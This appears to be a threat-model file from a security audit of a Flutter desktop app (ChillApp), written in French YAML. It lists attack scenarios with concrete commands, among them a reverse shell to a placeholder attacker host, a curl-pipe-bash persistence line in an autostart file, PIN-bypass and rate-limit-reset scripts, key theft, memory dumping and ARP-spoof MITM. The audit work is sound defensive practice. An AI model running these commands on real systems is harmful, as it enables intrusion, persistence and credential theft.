@@ -1,0 +1,906 @@
+schema_version: "1.0.0"
+phase: 4
+generated_at: "2026-02-18T14:45:00Z"
+input_ref: "P3_vulnerabilities.yaml"
+
+attack_scenarios:
+
+  # ============================================
+  # CRITIQUES
+  # ============================================
+
+  - id: ATK-001
+    vuln_refs: ["VULN-001"]
+    category: SUP
+    title: "Remplacement du binaire daemon Tailscale pour execution de code"
+    attacker_profile: "Attaquant avec acces local au filesystem utilisateur (malware, insider, ou acces physique)"
+    attacker_skill_level: "competent"
+    attacker_position: "local"
+    preconditions:
+      - "Acces en ecriture au repertoire contenant le binaire chill-tailscale"
+      - "L'utilisateur relance ChillApp (ou le systeme redemarre)"
+    attack_steps:
+      - step: 1
+        action: "Localiser le binaire daemon Tailscale"
+        command: "find ~/.local/share/chill-app/ /usr/lib/chill-app/ /opt/chill-app/ -name 'chill-tailscale*' 2>/dev/null"
+        tool: "find/bash"
+        result: "Chemin du binaire identifie (ex: ~/.local/share/chill-app/chill-tailscale-linux-amd64)"
+        detection_risk: "basse"
+      - step: 2
+        action: "Compiler un binaire malveillant avec le meme nom"
+        command: "go build -o chill-tailscale-linux-amd64 malicious_daemon.go"
+        tool: "Go compiler"
+        result: "Binaire malveillant pret — inclut un reverse shell + forwarding SSH intact pour masquer l'attaque"
+        detection_risk: "basse"
+      - step: 3
+        action: "Remplacer le binaire original"
+        command: "cp malicious_daemon ~/.local/share/chill-app/chill-tailscale-linux-amd64 && chmod +x ~/.local/share/chill-app/chill-tailscale-linux-amd64"
+        tool: "cp/chmod"
+        result: "Le binaire original est remplace. Aucune alerte car aucune verification d'integrite."
+        detection_risk: "basse"
+      - step: 4
+        action: "Attendre le redemarrage de l'app ou le forcer"
+        command: "# L'utilisateur clique sur 'Connecter Tailscale' dans l'interface"
+        tool: "attente"
+        result: "L'app execute Process.start(daemonPath, []) sur le binaire malveillant (tailscale_provider.dart:141)"
+        detection_risk: "basse"
+      - step: 5
+        action: "Le daemon malveillant s'execute avec acces Tailscale + SSH forwarding"
+        command: "# Le reverse shell contacte le serveur C2 de l'attaquant"
+        tool: "reverse shell"
+        result: "Execution de code avec acces au reseau Tailscale, aux cles WireGuard, et au SSH forwarding"
+        detection_risk: "moyenne"
+    impact: "Execution de code au demarrage de l'app. L'attaquant controle le daemon Tailscale, accede au reseau VPN, et peut utiliser le SSH forwarding pour atteindre d'autres machines du tailnet."
+    severity: CRITIQUE
+    cvss: 9.3
+    evidence:
+      file: "lib/features/tailscale/tailscale_provider.dart"
+      line: 141
+      code: "_daemon = await Process.start(daemonPath, []);"
+      issue: "Aucune verification de checksum, hash ou signature avant execution. _getDaemonPath() (lignes 92-129) cherche le binaire sans jamais verifier son integrite."
+    estimated_time: "30 minutes"
+    tools_required: ["Go compiler", "reverse shell framework", "acces filesystem"]
+    detection_difficulty: "difficile"
+    indicators_of_compromise:
+      - "Hash du binaire different de l'original"
+      - "Connexions reseau sortantes inattendues depuis le daemon"
+      - "Taille du binaire modifiee"
+
+  - id: ATK-002
+    vuln_refs: ["VULN-002"]
+    category: STO
+    title: "Contournement du lock PIN par suppression des cles SharedPreferences"
+    attacker_profile: "Attaquant avec acces local au meme compte utilisateur (malware, script, ou acces physique)"
+    attacker_skill_level: "script_kiddie"
+    attacker_position: "local"
+    preconditions:
+      - "Acces en ecriture au fichier SharedPreferences de l'application"
+      - "L'application est fermee ou peut etre relancee"
+    attack_steps:
+      - step: 1
+        action: "Localiser le fichier SharedPreferences"
+        command: "find ~/.local/share/ ~/.config/ -name '*.json' -path '*chill*' 2>/dev/null || find ~/.local/share/ -name 'shared_preferences*' 2>/dev/null"
+        tool: "find/bash"
+        result: "Fichier SharedPreferences localise (fichier JSON texte clair)"
+        detection_risk: "basse"
+      - step: 2
+        action: "Lire le contenu et identifier les cles PIN"
+        command: "cat shared_preferences.json | python3 -m json.tool | grep -E 'pin_hash|pin_salt|pin_failed|pin_locked'"
+        tool: "cat/grep"
+        result: "Cles identifiees: pin_hash, pin_salt, pin_failed_attempts, pin_locked_until"
+        detection_risk: "basse"
+      - step: 3
+        action: "Supprimer les cles PIN pour desactiver le lock"
+        command: "python3 -c \"import json; f=open('shared_preferences.json','r+'); d=json.load(f); [d.pop(k,None) for k in ['pin_hash','pin_salt','pin_failed_attempts','pin_locked_until']]; f.seek(0); f.truncate(); json.dump(d,f)\""
+        tool: "python3"
+        result: "Les cles PIN sont supprimees. isEnabled retourne false (lock_provider.dart:65: prefs.getString(_pinHashKey) != null)"
+        detection_risk: "basse"
+      - step: 4
+        action: "Relancer l'application"
+        command: "# Ouvrir ChillApp normalement"
+        tool: "lancement app"
+        result: "L'app demarre sans ecran de verrouillage — acces complet a l'interface"
+        detection_risk: "basse"
+    impact: "Contournement total du lock PIN. Acces a l'integralite de l'interface: configuration SSH, Tailscale, securite OS, WoL."
+    severity: CRITIQUE
+    cvss: 8.1
+    evidence:
+      file: "lib/features/lock/lock_provider.dart"
+      line: 65
+      code: "final hasPin = prefs.getString(_pinHashKey) != null;"
+      issue: "L'etat isEnabled depend uniquement de la presence d'une cle dans un fichier texte clair. Supprimer la cle = lock desactive."
+    estimated_time: "5 minutes"
+    tools_required: ["python3 ou editeur de texte", "acces filesystem"]
+    detection_difficulty: "difficile"
+    indicators_of_compromise:
+      - "Fichier SharedPreferences modifie (timestamp)"
+      - "Cles pin_hash/pin_salt absentes alors qu'un PIN etait configure"
+
+  - id: ATK-003
+    vuln_refs: ["VULN-003", "VULN-002"]
+    category: FLT
+    title: "Degradation complete de la securite OS via les toggles apres bypass PIN"
+    attacker_profile: "Attaquant ayant contourne le PIN (ATK-002) et pouvant interagir avec l'interface"
+    attacker_skill_level: "script_kiddie"
+    attacker_position: "local"
+    preconditions:
+      - "Lock PIN contourne (via ATK-002)"
+      - "L'utilisateur approuve les dialogues pkexec/UAC (ou l'attaquant a un acces physique)"
+    attack_steps:
+      - step: 1
+        action: "Contourner le PIN via ATK-002"
+        command: "# Voir ATK-002"
+        tool: "ATK-002"
+        result: "Acces a l'interface sans lock"
+        detection_risk: "basse"
+      - step: 2
+        action: "Naviguer vers la page Securite OS dans l'interface"
+        command: "# Clic dans l'interface ChillApp"
+        tool: "interface utilisateur"
+        result: "Page de securite OS affichee avec les toggles"
+        detection_risk: "basse"
+      - step: 3
+        action: "Desactiver le pare-feu"
+        command: "# Toggle OFF pare-feu -> execute: SecurityCommands.disableLinuxFirewall() qui lance 'ufw disable' via pkexec"
+        tool: "interface ChillApp"
+        result: "Pare-feu desactive. security_commands.dart:30+ execute la commande."
+        detection_risk: "haute"
+      - step: 4
+        action: "Desactiver AppArmor"
+        command: "# Toggle OFF AppArmor -> execute: SecurityCommands.disableLinuxAppArmor() via pkexec"
+        tool: "interface ChillApp"
+        result: "AppArmor desactive. Les profils de confinement ne s'appliquent plus."
+        detection_risk: "haute"
+      - step: 5
+        action: "Desactiver fail2ban"
+        command: "# Toggle OFF fail2ban -> execute: SecurityCommands.disableLinuxFail2ban() via pkexec"
+        tool: "interface ChillApp"
+        result: "fail2ban desactive. Protection brute-force SSH inactive."
+        detection_risk: "haute"
+      - step: 6
+        action: "Sur Windows: activer SMBv1 et RDP"
+        command: "# Toggle ON SMBv1 -> disableWindowsSmb1Protection() (reactive SMBv1). Toggle ON RDP -> disableWindowsRdpProtection() (active RDP)"
+        tool: "interface ChillApp"
+        result: "SMBv1 reactif (EternalBlue). RDP actif (BlueKeep, brute force)."
+        detection_risk: "haute"
+    impact: "Toutes les protections OS sont desactivees: pare-feu, AppArmor, fail2ban. Services dangereux actives: SMBv1, RDP. La machine est completement exposee."
+    severity: CRITIQUE
+    cvss: 8.5
+    evidence:
+      file: "lib/features/security/security_commands.dart"
+      line: 30
+      code: "static Future<bool> disableWindowsFirewall() async { ... }"
+      issue: "Methodes disable* pour chaque protection. Pas de journal d'audit, pas de confirmation supplementaire au-dela de pkexec/UAC."
+    estimated_time: "2 minutes (apres bypass PIN)"
+    tools_required: ["Acces a l'interface ChillApp", "Mot de passe admin (pour pkexec/UAC)"]
+    detection_difficulty: "facile"
+    indicators_of_compromise:
+      - "Pare-feu desactive"
+      - "AppArmor/fail2ban arretes"
+      - "SMBv1/RDP actives"
+      - "Evenements systemd montrant l'arret des services"
+
+  # ============================================
+  # HAUTES
+  # ============================================
+
+  - id: ATK-004
+    vuln_refs: ["VULN-004"]
+    category: FLT
+    title: "Race condition TOCTOU pour injecter des commandes root via scripts temporaires"
+    attacker_profile: "Attaquant avec acces root ou capacite de surveiller /tmp (processus co-localise)"
+    attacker_skill_level: "expert"
+    attacker_position: "local"
+    preconditions:
+      - "L'attaquant peut surveiller la creation de fichiers dans /tmp"
+      - "L'utilisateur declenche une action qui ecrit un script temp (SSH setup, securite, WoL)"
+      - "Privileges root ou meme proprietaire du fichier temp"
+    attack_steps:
+      - step: 1
+        action: "Surveiller /tmp pour les fichiers chill_*"
+        command: "inotifywait -m /tmp -e create --format '%f' | grep chill_"
+        tool: "inotifywait"
+        result: "Detection de la creation du script temporaire"
+        detection_risk: "basse"
+      - step: 2
+        action: "Remplacer le contenu du script entre createTemp et pkexec"
+        command: "#!/bin/bash\nwhile inotifywait -e create /tmp; do\n  f=$(ls -t /tmp/chill_* 2>/dev/null | head -1)\n  [ -n \"$f\" ] && echo 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1' > \"$f\"\ndone"
+        tool: "inotifywait + bash"
+        result: "Le script est modifie avant l'execution pkexec"
+        detection_risk: "moyenne"
+      - step: 3
+        action: "pkexec execute le script modifie en root"
+        command: "# L'app execute: CommandRunner.runElevated('bash', [tempScript.path])"
+        tool: "pkexec (via l'app)"
+        result: "Reverse shell root vers l'attaquant"
+        detection_risk: "haute"
+    impact: "Execution de commandes arbitraires en root. La fenetre TOCTOU entre writeAsString() et runElevated() permet l'injection."
+    severity: HAUTE
+    cvss: 7.0
+    evidence:
+      file: "lib/features/ssh_setup/ssh_setup_provider.dart"
+      line: 287
+      code: "await tempScript.writeAsString(script);\nresult = await CommandRunner.runElevated('bash', [tempScript.path]);"
+      issue: "Fenetre de race entre ecriture et execution. Meme pattern dans security_commands.dart:293 et wol_setup_provider.dart:316."
+    estimated_time: "1 heure (mise en place du monitoring)"
+    tools_required: ["inotifywait", "bash", "privileges root ou meme utilisateur"]
+    detection_difficulty: "moderee"
+    indicators_of_compromise:
+      - "Processus inotifywait surveillant /tmp"
+      - "Scripts /tmp avec contenu inattendu"
+      - "Connexions reseau sortantes depuis un processus root"
+
+  - id: ATK-005
+    vuln_refs: ["VULN-005"]
+    category: FLT
+    title: "Injection de commande via chemin .desktop non echappe"
+    attacker_profile: "Attaquant pouvant manipuler le chemin d'installation de l'app ou le fichier .desktop"
+    attacker_skill_level: "competent"
+    attacker_position: "local"
+    preconditions:
+      - "L'app est installee dans un chemin contenant des caracteres speciaux"
+      - "Ou l'attaquant peut modifier le fichier .desktop dans ~/.config/autostart/"
+    attack_steps:
+      - step: 1
+        action: "Identifier le fichier .desktop de l'autostart"
+        command: "cat ~/.config/autostart/chill-app.desktop"
+        tool: "cat"
+        result: "Contenu du fichier .desktop avec le champ Exec= contenant le chemin non echappe"
+        detection_risk: "basse"
+      - step: 2
+        action: "Modifier le champ Exec pour injecter une commande"
+        command: "sed -i 's|Exec=.*|Exec=/bin/bash -c \"curl http://ATTACKER/payload.sh|bash\"|' ~/.config/autostart/chill-app.desktop"
+        tool: "sed"
+        result: "Le fichier .desktop execute la commande malveillante au prochain login"
+        detection_risk: "basse"
+      - step: 3
+        action: "Attendre le prochain login de l'utilisateur"
+        command: "# L'autostart de XDG execute le .desktop au login"
+        tool: "attente"
+        result: "Execution de code au demarrage de la session utilisateur"
+        detection_risk: "moyenne"
+    impact: "Persistance: execution de code a chaque login. Le fichier .desktop est dans le repertoire utilisateur, modifiable sans privileges root."
+    severity: HAUTE
+    cvss: 7.3
+    evidence:
+      file: "lib/features/settings/settings_provider.dart"
+      line: 98
+      code: "'Exec=$exePath\\n'"
+      issue: "Platform.resolvedExecutable interpole directement dans Exec= sans echappement. Le fichier .desktop est accessible en ecriture par l'utilisateur."
+    estimated_time: "5 minutes"
+    tools_required: ["editeur de texte", "acces filesystem utilisateur"]
+    detection_difficulty: "moderee"
+    indicators_of_compromise:
+      - "Champ Exec modifie dans le fichier .desktop"
+      - "Hash du fichier .desktop different de l'attendu"
+
+  - id: ATK-006
+    vuln_refs: ["VULN-006"]
+    category: STO
+    title: "Vol des cles Tailscale WireGuard pour usurpation de noeud"
+    attacker_profile: "Attaquant avec acces au meme compte utilisateur (malware, extension navigateur, autre app)"
+    attacker_skill_level: "competent"
+    attacker_position: "local"
+    preconditions:
+      - "Le daemon Tailscale a ete lance au moins une fois (cles generees)"
+      - "Acces lecture au repertoire ~/.local/share/chill-app/tailscale/"
+    attack_steps:
+      - step: 1
+        action: "Localiser le repertoire d'etat Tailscale"
+        command: "ls -la ~/.local/share/chill-app/tailscale/"
+        tool: "ls"
+        result: "Repertoire avec permissions 0700 contenant les fichiers d'etat et cles WireGuard"
+        detection_risk: "basse"
+      - step: 2
+        action: "Copier toutes les cles et l'etat"
+        command: "cp -r ~/.local/share/chill-app/tailscale/ /tmp/stolen_keys/"
+        tool: "cp"
+        result: "Cles WireGuard, identite du noeud, et etat Tailscale exfiltres"
+        detection_risk: "basse"
+      - step: 3
+        action: "Configurer un daemon Tailscale malveillant avec les cles volees"
+        command: "# Utiliser tsnet avec StateDir pointant vers les cles volees"
+        tool: "daemon Go custom"
+        result: "Le noeud malveillant usurpe l'identite du noeud ChillApp sur le tailnet"
+        detection_risk: "moyenne"
+      - step: 4
+        action: "Acceder aux services du tailnet avec l'identite volee"
+        command: "ssh user@target-machine.tailnet"
+        tool: "ssh"
+        result: "Acces SSH aux machines du tailnet en tant que noeud ChillApp"
+        detection_risk: "haute"
+    impact: "Usurpation de l'identite du noeud Tailscale. Acces a tous les services autorises pour ce noeud dans les ACLs du tailnet."
+    severity: HAUTE
+    cvss: 7.5
+    evidence:
+      file: "tailscale-daemon/main.go"
+      line: 69
+      code: "os.MkdirAll(dir, 0700)"
+      issue: "Permissions 0700 ne protegent que contre les AUTRES utilisateurs. Tout processus du meme utilisateur peut lire les cles."
+    estimated_time: "15 minutes"
+    tools_required: ["acces filesystem", "daemon Tailscale/tsnet"]
+    detection_difficulty: "moderee"
+    indicators_of_compromise:
+      - "Deux noeuds avec la meme identite sur le tailnet"
+      - "Connexions depuis une IP inattendue"
+
+  - id: ATK-007
+    vuln_refs: ["VULN-007"]
+    category: FLT
+    title: "Injection de commandes IPC pour controler le daemon Tailscale"
+    attacker_profile: "Attaquant ayant acces au processus daemon (meme utilisateur, ou via un binaire remplace)"
+    attacker_skill_level: "competent"
+    attacker_position: "local"
+    preconditions:
+      - "Le daemon chill-tailscale est en cours d'execution"
+      - "L'attaquant peut ecrire sur le stdin du daemon ou remplacer le binaire (ATK-001)"
+    attack_steps:
+      - step: 1
+        action: "Identifier le PID du daemon"
+        command: "pgrep -f chill-tailscale"
+        tool: "pgrep"
+        result: "PID du daemon identifie"
+        detection_risk: "basse"
+      - step: 2
+        action: "Envoyer une commande JSON de login sur stdin"
+        command: "echo '{\"action\":\"login\"}' > /proc/$PID/fd/0"
+        tool: "echo/proc filesystem"
+        result: "Le daemon execute la commande login sans verifier l'emetteur (main.go:240-262)"
+        detection_risk: "moyenne"
+      - step: 3
+        action: "Envoyer une commande de shutdown pour perturber le service"
+        command: "echo '{\"action\":\"shutdown\"}' > /proc/$PID/fd/0"
+        tool: "echo/proc filesystem"
+        result: "Le daemon s'arrete proprement, coupant le tunnel Tailscale et le SSH forwarding"
+        detection_risk: "haute"
+    impact: "Controle du daemon: login/logout/shutdown/status. Un attaquant peut couper le tunnel Tailscale ou forcer un re-login vers un serveur de coordination controle."
+    severity: HAUTE
+    cvss: 7.1
+    evidence:
+      file: "lib/features/tailscale/tailscale_provider.dart"
+      line: 294
+      code: "_daemon!.stdin.writeln(jsonEncode(cmd));"
+      issue: "Commandes JSON en clair sur stdin. Le daemon accepte toute commande valide sans authentification."
+    estimated_time: "10 minutes"
+    tools_required: ["acces au proc filesystem", "connaissance du protocole IPC JSON"]
+    detection_difficulty: "moderee"
+    indicators_of_compromise:
+      - "Commandes IPC provenant d'un PID inattendu"
+      - "Login/logout non declenches par l'interface"
+
+  - id: ATK-008
+    vuln_refs: ["VULN-008"]
+    category: CRY
+    title: "Extraction du PIN par dump memoire du processus Dart"
+    attacker_profile: "Attaquant avec privileges root sur la machine (ou exploit kernel)"
+    attacker_skill_level: "competent"
+    attacker_position: "local"
+    preconditions:
+      - "L'utilisateur a entre son PIN recemment (le PIN est encore en memoire)"
+      - "L'attaquant a les privileges pour dumper la memoire du processus Flutter"
+    attack_steps:
+      - step: 1
+        action: "Identifier le PID du processus ChillApp"
+        command: "pgrep -f chill_app"
+        tool: "pgrep"
+        result: "PID du processus Flutter"
+        detection_risk: "basse"
+      - step: 2
+        action: "Dumper la memoire du processus"
+        command: "gcore -o /tmp/chill_dump $PID"
+        tool: "gcore (GDB)"
+        result: "Core dump du processus contenant le heap Dart"
+        detection_risk: "moyenne"
+      - step: 3
+        action: "Chercher le PIN dans le dump"
+        command: "strings /tmp/chill_dump.* | grep -E '^[0-9]{4,8}$' | sort -u"
+        tool: "strings/grep"
+        result: "Candidats PIN extraits du dump memoire (les Strings Dart immutables persistent en memoire)"
+        detection_risk: "basse"
+      - step: 4
+        action: "Valider le PIN trouve"
+        command: "# Tester chaque candidat dans l'interface ChillApp"
+        tool: "interface ChillApp"
+        result: "PIN valide identifie — acces complet a l'interface"
+        detection_risk: "basse"
+    impact: "Extraction du PIN en clair depuis la memoire. Les strings Dart sont immutables et ne peuvent pas etre effacees explicitement."
+    severity: HAUTE
+    cvss: 6.8
+    evidence:
+      file: "lib/features/lock/lock_provider.dart"
+      line: 143
+      code: "Future<void> setPin(String pin) async {"
+      issue: "Le parametre 'pin' est un String Dart immutable. Le GC peut ou non liberer la memoire. Le PIN persiste jusqu'a la prochaine collection."
+    estimated_time: "15 minutes"
+    tools_required: ["gcore ou gdb", "strings", "privileges root"]
+    detection_difficulty: "moderee"
+    indicators_of_compromise:
+      - "Processus gcore ou gdb attache au processus ChillApp"
+      - "Core dump dans /tmp"
+
+  - id: ATK-009
+    vuln_refs: ["VULN-009"]
+    category: NET
+    title: "Acces SSH via noeud Tailscale compromis exploitant le forwarding ouvert"
+    attacker_profile: "Attaquant controlant un noeud du meme tailnet"
+    attacker_skill_level: "competent"
+    attacker_position: "remote"
+    preconditions:
+      - "L'attaquant controle un noeud du tailnet (via VULN-006, supply chain, ou noeud compromis)"
+      - "Le daemon chill-tailscale est actif avec SSH forwarding"
+      - "Le serveur SSH local (port 22) est actif"
+    attack_steps:
+      - step: 1
+        action: "Scanner le tailnet pour identifier les noeuds avec port 22 ouvert"
+        command: "tailscale status | grep -v offline && nmap -p 22 100.x.y.z"
+        tool: "tailscale/nmap"
+        result: "Noeud ChillApp identifie avec port 22 ouvert sur le tailnet"
+        detection_risk: "moyenne"
+      - step: 2
+        action: "Se connecter au SSH via le forwarding Tailscale"
+        command: "ssh user@100.x.y.z"
+        tool: "ssh"
+        result: "Le daemon Go forwarde la connexion vers localhost:22 (main.go:181) sans filtrage ni rate limiting"
+        detection_risk: "haute"
+      - step: 3
+        action: "Brute force ou utiliser des credentials volees"
+        command: "hydra -l user -P wordlist.txt ssh://100.x.y.z"
+        tool: "hydra"
+        result: "Acces SSH a la machine cible"
+        detection_risk: "haute"
+    impact: "Acces SSH complet a la machine via le tunnel Tailscale. Le daemon forwarde toutes les connexions sans whitelist, rate limiting ou journalisation."
+    severity: HAUTE
+    cvss: 7.5
+    evidence:
+      file: "tailscale-daemon/main.go"
+      line: 181
+      code: "localConn, err := net.DialTimeout(\"tcp\", \"127.0.0.1:22\", 5*time.Second)"
+      issue: "startForwarding() accepte toute connexion sans filtrage. Le seul controle est l'appartenance au tailnet."
+    estimated_time: "30 minutes"
+    tools_required: ["noeud Tailscale compromis", "ssh/hydra"]
+    detection_difficulty: "moderee"
+    indicators_of_compromise:
+      - "Connexions SSH depuis des noeuds Tailscale inhabituels"
+      - "Tentatives de brute force sur le port 22"
+
+  - id: ATK-010
+    vuln_refs: ["VULN-010", "VULN-002"]
+    category: STO
+    title: "Brute force PIN apres reset du rate limiting dans SharedPreferences"
+    attacker_profile: "Attaquant avec acces au fichier SharedPreferences"
+    attacker_skill_level: "script_kiddie"
+    attacker_position: "local"
+    preconditions:
+      - "Un PIN est configure"
+      - "Acces en ecriture au fichier SharedPreferences"
+    attack_steps:
+      - step: 1
+        action: "Lire le hash PIN et le sel depuis SharedPreferences"
+        command: "cat shared_preferences.json | python3 -c \"import json,sys; d=json.load(sys.stdin); print(d.get('pin_hash','N/A'), d.get('pin_salt','N/A'))\""
+        tool: "python3"
+        result: "Hash PBKDF2-HMAC-SHA256 et sel extraits"
+        detection_risk: "basse"
+      - step: 2
+        action: "Ecrire un script de brute force PBKDF2 offline"
+        command: "python3 brute_pin.py --hash $HASH --salt $SALT --iterations 100000 --max-digits 8"
+        tool: "python3 + hashlib"
+        result: "Brute force de 10^8 combinaisons (8 chiffres). ~24h sur GPU, ~1 semaine sur CPU."
+        detection_risk: "basse"
+      - step: 3
+        action: "Alternative rapide: reset le rate limiting et brute force en ligne"
+        command: "while true; do python3 -c \"import json; f=open('shared_preferences.json','r+'); d=json.load(f); d['pin_failed_attempts']=0; d.pop('pin_locked_until',None); f.seek(0); f.truncate(); json.dump(d,f); f.close()\"; # tenter le PIN dans l'interface; done"
+        tool: "python3 + interface ChillApp"
+        result: "Rate limiting contourne. Tentatives illimitees possibles."
+        detection_risk: "basse"
+    impact: "PIN cracke par brute force offline ou online (apres reset du rate limiting). 10^8 combinaisons pour 8 chiffres."
+    severity: HAUTE
+    cvss: 6.5
+    evidence:
+      file: "lib/features/lock/lock_provider.dart"
+      line: 215
+      code: "await prefs.setInt(_lockedUntilKey, newLockedUntil.millisecondsSinceEpoch);"
+      issue: "Le compteur et le timestamp sont dans SharedPreferences — modifiables par tout processus du meme utilisateur."
+    estimated_time: "24 heures (brute force offline) ou illimite (online avec reset)"
+    tools_required: ["python3", "hashlib", "acces SharedPreferences"]
+    detection_difficulty: "difficile"
+    indicators_of_compromise:
+      - "Compteur pin_failed_attempts remis a 0 de maniere repetee"
+      - "Fichier SharedPreferences modifie frequemment"
+
+  # ============================================
+  # MOYENNES
+  # ============================================
+
+  - id: ATK-011
+    vuln_refs: ["VULN-011"]
+    category: NET
+    title: "Surveillance du presse-papiers pour exfiltrer les infos reseau"
+    attacker_profile: "Malware ou application malveillante sur la meme machine"
+    attacker_skill_level: "script_kiddie"
+    attacker_position: "local"
+    preconditions:
+      - "L'utilisateur copie une info reseau (IP, MAC, hostname) depuis l'interface"
+      - "Un malware surveille le presse-papiers"
+    attack_steps:
+      - step: 1
+        action: "Installer un clipboard monitor"
+        command: "xclip -selection clipboard -o -l 0 | while read line; do echo \"$(date): $line\" >> /tmp/clipboard_log; done"
+        tool: "xclip"
+        result: "Chaque copie dans le presse-papiers est enregistree"
+        detection_risk: "basse"
+      - step: 2
+        action: "Attendre que l'utilisateur copie les infos reseau"
+        command: "# L'utilisateur clique sur le bouton copier dans CopyableInfo widget"
+        tool: "attente"
+        result: "IP, MAC, hostname captures dans le log"
+        detection_risk: "basse"
+      - step: 3
+        action: "Utiliser les infos pour cibler la machine"
+        command: "# IP pour scanner, MAC pour WoL, hostname pour identification"
+        tool: "nmap/wakeonlan"
+        result: "Machine identifiee et ciblable"
+        detection_risk: "moyenne"
+    impact: "Fuite d'informations reseau (IP, MAC, hostname) via le presse-papiers. Facilite le ciblage de la machine."
+    severity: MOYENNE
+    cvss: 4.3
+    evidence:
+      file: "lib/shared/widgets/copyable_info.dart"
+      line: 1
+      code: "class CopyableInfo extends StatelessWidget"
+      issue: "Le presse-papiers est accessible par toutes les applications sur le bureau."
+    estimated_time: "5 minutes (installation du monitor)"
+    tools_required: ["xclip ou equivalent", "script bash"]
+    detection_difficulty: "difficile"
+    indicators_of_compromise:
+      - "Processus surveillant le presse-papiers"
+
+  - id: ATK-012
+    vuln_refs: ["VULN-012"]
+    category: FLT
+    title: "Accumulation de processus orphelins root par timeout repete"
+    attacker_profile: "Attaquant local ou situation de dysfonctionnement"
+    attacker_skill_level: "script_kiddie"
+    attacker_position: "local"
+    preconditions:
+      - "L'utilisateur declenche des actions elevees qui timeout (reseau lent, serveur apt lent)"
+    attack_steps:
+      - step: 1
+        action: "Declencher des actions elevees de maniere repetee"
+        command: "# Cliquer rapidement sur les boutons de configuration SSH, WoL, securite"
+        tool: "interface ChillApp"
+        result: "Plusieurs processus pkexec lances en parallele"
+        detection_risk: "basse"
+      - step: 2
+        action: "Attendre le timeout de 120 secondes"
+        command: "# Les Futures Dart timeout mais Process.run ne tue pas le processus"
+        tool: "attente"
+        result: "Processus orphelins avec privileges root qui continuent en arriere-plan"
+        detection_risk: "basse"
+      - step: 3
+        action: "Les processus orphelins consomment des ressources"
+        command: "ps aux | grep pkexec"
+        tool: "ps"
+        result: "Multiple processus pkexec orphelins actifs, consommant CPU/memoire"
+        detection_risk: "moyenne"
+    impact: "Epuisement de ressources par accumulation de processus root orphelins. Potentiel deni de service local."
+    severity: MOYENNE
+    cvss: 5.3
+    evidence:
+      file: "lib/core/command_runner.dart"
+      line: 27
+      code: "// NOTE: Process.run().timeout() does not kill the underlying process on timeout."
+      issue: "Limitation Dart documentee. Les processus pkexec ne sont jamais tues apres timeout."
+    estimated_time: "5 minutes"
+    tools_required: ["Interface ChillApp"]
+    detection_difficulty: "facile"
+    indicators_of_compromise:
+      - "Nombre eleve de processus pkexec"
+      - "Consommation CPU/memoire anormale"
+
+  - id: ATK-013
+    vuln_refs: ["VULN-013"]
+    category: FLT
+    title: "Reverse engineering du binaire Flutter pour comprendre la logique de securite"
+    attacker_profile: "Hacker competent ou agent IA offensif"
+    attacker_skill_level: "competent"
+    attacker_position: "local"
+    preconditions:
+      - "Acces au binaire Flutter de l'application (directement sur le filesystem desktop)"
+    attack_steps:
+      - step: 1
+        action: "Extraire les symboles avec Blutter"
+        command: "blutter /path/to/chill_app/lib/libapp.so /tmp/blutter_output"
+        tool: "Blutter"
+        result: "Noms de classes, methodes, signatures extraites du snapshot Dart AOT"
+        detection_risk: "basse"
+      - step: 2
+        action: "Analyser avec GhidrAssist (LLM-assisted)"
+        command: "# Charger dans Ghidra + plugin GhidrAssist avec mode agentique"
+        tool: "Ghidra + GhidrAssist"
+        result: "Comprehension de la logique de validation PIN, des chemins d'elevation pkexec, des commandes de securite"
+        detection_risk: "basse"
+      - step: 3
+        action: "Identifier les chemins d'attaque"
+        command: "# Analyser les methodes: setPin, verifyPin, runElevated, disableFirewall"
+        tool: "Ghidra + LLM"
+        result: "Carte complete de la logique de securite. Identification des faiblesses exploitables."
+        detection_risk: "basse"
+    impact: "Comprehension complete de la logique applicative. Facilite toutes les autres attaques. Sans obfuscation, le RE est trivial."
+    severity: MOYENNE
+    cvss: 4.0
+    evidence:
+      file: "pubspec.yaml"
+      line: 1
+      code: "name: chill_app"
+      issue: "Pas d'obfuscation (--obfuscate --split-debug-info). Le binaire contient tous les noms en clair."
+    estimated_time: "2 heures"
+    tools_required: ["Blutter", "Ghidra", "GhidrAssist ou LLM"]
+    detection_difficulty: "invisible"
+    indicators_of_compromise:
+      - "Aucun — l'analyse est hors-ligne"
+
+  - id: ATK-014
+    vuln_refs: ["VULN-014"]
+    category: NET
+    title: "MITM sur google_fonts pour servir des polices malformees"
+    attacker_profile: "Attaquant en position MITM sur le reseau"
+    attacker_skill_level: "expert"
+    attacker_position: "same_network"
+    preconditions:
+      - "Position MITM (Evil Twin WiFi, ARP spoofing)"
+      - "L'app telecharge des polices au premier lancement (pas de cache local)"
+    attack_steps:
+      - step: 1
+        action: "Se positionner en MITM"
+        command: "bettercap -iface wlan0 -eval 'set arp.spoof.targets TARGET_IP; arp.spoof on; set https.proxy.sslstrip true; https.proxy on'"
+        tool: "bettercap"
+        result: "Interception du trafic reseau de la machine cible"
+        detection_risk: "moyenne"
+      - step: 2
+        action: "Intercepter la requete vers fonts.googleapis.com"
+        command: "# Proxy intercepte la requete HTTPS et sert une police TrueType malformee"
+        tool: "mitmproxy"
+        result: "Police malformee servie a l'application"
+        detection_risk: "moyenne"
+      - step: 3
+        action: "La police malformee exploite un bug du parseur FreeType"
+        command: "# CVE-2025-27363 (FreeType RCE zero-click) si FreeType embarque est vulnerable"
+        tool: "police TrueType forgee"
+        result: "Potentielle RCE zero-click via le moteur de rendu Flutter"
+        detection_risk: "basse"
+    impact: "Si FreeType embarque dans Flutter est vulnerable (CVE-2025-27363), RCE zero-click via police malformee. Impact maximal. Si non vulnerable, crash ou corruption de rendu."
+    severity: MOYENNE
+    cvss: 4.8
+    evidence:
+      file: "pubspec.yaml"
+      line: 16
+      code: "google_fonts: ^8.0.1"
+      issue: "Pas de certificate pinning. Les polices sont telechargees au runtime depuis Internet."
+    estimated_time: "1 heure"
+    tools_required: ["bettercap/mitmproxy", "police TrueType forgee"]
+    detection_difficulty: "difficile"
+    indicators_of_compromise:
+      - "Trafic MITM detecte"
+      - "Polices inhabituelles dans le cache"
+
+  - id: ATK-015
+    vuln_refs: ["VULN-015"]
+    category: FLT
+    title: "Injection XML dans le plist macOS pour persistance malveillante"
+    attacker_profile: "Attaquant avec acces au filesystem utilisateur macOS"
+    attacker_skill_level: "competent"
+    attacker_position: "local"
+    preconditions:
+      - "L'app est configuree pour l'autostart sur macOS"
+      - "Acces en ecriture a ~/Library/LaunchAgents/"
+    attack_steps:
+      - step: 1
+        action: "Localiser le plist de l'autostart"
